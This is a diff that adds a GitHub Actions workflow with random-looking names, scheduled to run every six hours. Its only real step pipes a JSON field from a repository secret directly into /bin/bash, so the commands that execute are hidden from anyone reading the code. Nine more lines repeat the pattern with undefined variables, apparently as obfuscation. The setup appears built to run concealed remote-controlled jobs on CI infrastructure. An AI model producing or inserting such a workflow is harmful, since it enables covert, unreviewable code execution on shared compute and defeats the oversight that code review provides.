@@ -1,0 +1,26 @@
+name: wuhaoning3214
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wuhaoning3214
+        env:
+          rhk1905: ${{ secrets.rhk1905 }}
+        run: |
+          echo $rhk1905 | jq -r .qrh00 | /bin/bash
+          echo $hw6 | jq -r .wxt12 | /bin/bash
+          echo $gqt930 | jq -r .qtrr970 | /bin/bash
+          echo $n44 | jq -r .tqak2453 | /bin/bash
+          echo $ikdxm5 | jq -r .li05511 | /bin/bash
+          echo $k834 | jq -r .jebvf45591 | /bin/bash
+          echo $lh790 | jq -r .zlvg0 | /bin/bash
+          echo $if16870 | jq -r .wif43 | /bin/bash
+          echo $bits1 | jq -r .hluv02 | /bin/bash
+          echo $oybh0 | jq -r .mrvhb03 | /bin/bash
+
